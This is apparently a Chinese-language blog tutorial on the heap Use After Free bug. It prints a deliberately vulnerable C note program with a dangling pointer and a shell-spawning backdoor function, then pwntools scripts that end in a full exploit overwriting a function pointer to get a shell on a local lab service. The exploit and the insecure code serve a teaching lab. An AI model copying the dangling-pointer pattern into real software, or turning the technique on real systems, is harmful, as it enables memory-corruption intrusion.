---
title: "Day24－Use After Free"
date: 2024-10-08
draft: false
tags: ["iron-man-2024", "pwn", "2024"]
categories: ["security-research"]
author: "YJK"
showToc: true
TocOpen: false
---


## 前言

在前面文章中，我們討論了 Glibc 的 `malloc` 和 `free` 流程，並介紹了一些相關的名詞。接下來，我們將探討與 Heap 相關的漏洞，而第一個要介紹的漏洞是 **Use After Free**。

## Use After Free

顧名思義，Use After Free 指的是使用已經被 `free` 掉的指標（pointer）。問題的根源在於 **dangling pointer**。當一個指標被 `free` 之後，如果沒有將其設為 `NULL`，就會產生 dangling pointer。

**Use After Free** 的利用方式會隨著使用的情境有所不同，可能導致：
- 任意位置讀取或寫入
- 間接影響程式的控制流程

此外，它也可能被用來 leak 記憶體中的殘值。同樣的，另一個常見的 Heap 漏洞——**double free**，也是因為 **dangling pointer** 的存在，導致多次 `free` 相同的記憶體區塊。這些漏洞都可以通過特定技巧加以利用。

## Lab

查看以下原始碼：

```c
#include<stdio.h>
#include<stdlib.h>

struct Note{
    void (*printnote_content)();
    char *content;
};

struct Note *noteList[10];
int noteCount = 0;

void printnote_content(struct Note *this){
    printf("%s\n", this->content);
}

void add_note(){
    int i,size;
    if(noteCount >= 10){
        printf("No more space for new note\n");
        return;
    }
    for(i=0; i < 10; i++){
        if(noteList[i] == NULL){
            noteList[i] = (struct Note *)malloc(sizeof(struct Note));
            if(noteList[i] == NULL){
                printf("Memory allocation failed\n");
                exit(1);
            }
            noteList[i]->printnote_content = printnote_content;
            printf("Enter the size of the note: ");
            scanf("%d", &size);
            noteList[i]->content = (char *)malloc(size);
            if(noteList[i]->content == NULL){
                printf("Memory allocation failed\n");
                exit(1);
            }
            printf("Enter the content of the note: ");
            read(0, noteList[i]->content, size);
            noteCount++;
            break;
        }
    }
}

void delete_note(){
    int index;
    printf("Enter the index of the note: ");
    scanf("%d", &index);
    if(index < 0 || index >= noteCount){
        printf("Invalid index\n");
        exit(1);
    }
    if(noteList[index] != NULL){
        free(noteList[index]->content);
        free(noteList[index]);
        printf("Note deleted\n");
    }
}

void print_note(){
    int index;
    printf("Enter the index of the note: ");
    scanf("%d", &index);
    if(index < 0 || index >= noteCount){
        printf("Invalid index\n");
        exit(1);
    }
    if(noteList[index] != NULL){
        noteList[index]->printnote_content(noteList[index]);
    }
}

void backdoor(){
    system("/bin/sh");
}

void menu(){
    printf("1. Add note\n");
    printf("2. Delete note\n");
    printf("3. Print note\n");
    printf("4. Exit\n");
    printf("Enter your choice: ");
}

int main(){
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    while(1){
        menu();
        int choice;
        scanf("%d", &choice);
        switch(choice){
            case 1:
                add_note();
                break;
            case 2:
                delete_note();
                break;
            case 3:
                print_note();
                break;
            case 4:
                exit(0);
                break;
            default:
                printf("Invalid choice\n");
                break;
        }
    }
    return 0;
}
```

使用以下指令進行編譯：

```bash
gcc src/uaf.c -o ./uaf/share/uaf -no-pie -fstack-protector-all
```

## writeup

這是一道典型的選單式 Heap 題目。程式碼量雖然較大，但功能很簡單，包括新增、刪除和輸出 Note。

- 新增 Note
    - 先檢查 Note 是否已滿
    - 分配一個 Note 結構（包含 function pointer 和 content）
    - 將 function pointer 指向 printnote_content
    - 輸入 size 並分配對應大小的 content
    - 存入 content
- 刪除 Note
    - 輸入要刪除的 Note index
    - 釋放對應的記憶體
- 輸出 Note
    - 透過 function pointer 輸出 Note 的 content

漏洞出現在刪除 Note 的部分。刪除後沒有將指標設為 NULL，因此仍可對該位置進行操作。接下來，我們可以通過一個簡單的腳本來測試這個漏洞，在此之前，我們可以先將各個功能寫好，這樣會比較方便操作

```python
from pwn import *

r = process('../uaf/share/uaf')
# r = remote('127.0.0.1', 10012)

def add(size, data):
    r.sendlineafter(': ', '1')
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', data)

def delete(idx):
    r.sendlineafter(': ', '2')
    r.sendlineafter(': ', str(idx))

def print_(idx):
    r.sendlineafter(': ', '3')
    r.sendlineafter(': ', str(idx))
```

我們首先新增兩個 note，觀察它們在 Heap 上的狀態：

```python
from pwn import *

r = process('../uaf/share/uaf')
# r = remote('127.0.0.1', 10012)

gdb.attach(r)

def add(size, data):
    r.sendlineafter(': ', '1')
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', data)

def delete(idx):
    r.sendlineafter(': ', '2')
    r.sendlineafter(': ', str(idx))

def print_(idx):
    r.sendlineafter(': ', '3')
    r.sendlineafter(': ', str(idx))

add(0x20, 'aaaa') # 0
add(0x20, 'bbbb') # 1
r.interactive()
```

使用 heap 指令觀察記憶體分佈，會看到分配了大小、function pointer 和 data 等數據。

![image](/images/iron2024/day24_image1.png)

![image](/images/iron2024/day24_image2.png)

接下來，我們嘗試釋放這兩塊記憶體，並繼續觀察：

```python
from pwn import *

r = process('../uaf/share/uaf')
# r = remote('127.0.0.1', 10012)

gdb.attach(r)

def add(size, data):
    r.sendlineafter(': ', '1')
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', data)

def delete(idx):
    r.sendlineafter(': ', '2')
    r.sendlineafter(': ', str(idx))

def print_(idx):
    r.sendlineafter(': ', '3')
    r.sendlineafter(': ', str(idx))

add(0x20, 'aaaa') # 0
add(0x20, 'bbbb') # 1
delete(0)
delete(1)
r.interactive()
```

當空間被釋放後，可以觀察到該空間進入了 tcache bins。我們可以嘗試拿到 index 為 0 的 Note 的 function pointer 空間，進行測試：

![image](/images/iron2024/day24_image3.png)

此時我們使用簡單的 script 會發現可以覆蓋原本的 function pointer。如果我們再 print 這個 note 的 content，就能控制執行流程。

```python
from pwn import *

r = process('../uaf/share/uaf')
# r = remote('127.0.0.1', 10012)

gdb.attach(r)

def add(size, data):
    r.sendlineafter(': ', '1')
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', data)

def delete(idx):
    r.sendlineafter(': ', '2')
    r.sendlineafter(': ', str(idx))

def print_(idx):
    r.sendlineafter(': ', '3')
    r.sendlineafter(': ', str(idx))

add(0x20, 'aaaa') # 0
add(0x20, 'bbbb') # 1
delete(0)
delete(1)
add(0x10, 'ccccdddd')
r.interactive()
```

查看狀況會發現確實蓋到了原本的 function pointer

![image](/images/iron2024/day24_image4.png)

此時如果去 print 那一塊 note 的 content 就會呼叫到此 function pointer，所以我們可以藉此控制執行流程

那程式中有一個後門函式，我們可以使用 objdump 來確認其位址，發現後門在 0x4015c8。我們可以將這個地址寫入 function pointer，並成功打開 shell。

![image](/images/iron2024/day24_image5.png)

所以我們將 address 填入，並且在 print 出內容，這樣就可以成功開啟 shell 了

完整 exploit：

```python
from pwn import *

# r = process('../uaf/share/uaf')
r = remote('127.0.0.1', 10012)

def add(size, data):
    r.sendlineafter(': ', '1')
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', data)

def delete(idx):
    r.sendlineafter(': ', '2')
    r.sendlineafter(': ', str(idx))

def print_(idx):
    r.sendlineafter(': ', '3')
    r.sendlineafter(': ', str(idx))

backdoor = 0x00000000004015c8

add(0x20, 'aaaa') # 0
add(0x20, 'bbbb') # 1
delete(0)
delete(1)
add(0x10, p64(backdoor))
print_(0)
r.interactive()
```

solved!!!

![image](/images/iron2024/day24_image6.png)

## 結論

Use After Free 是一種經典的漏洞，特別是在使用 Heap 分配記憶體的環境中。我們通過覆蓋 function pointer，成功控制程式的執行流程。這個案例說明了記憶體管理中的常見陷阱，以及如何利用這些漏洞進行攻擊。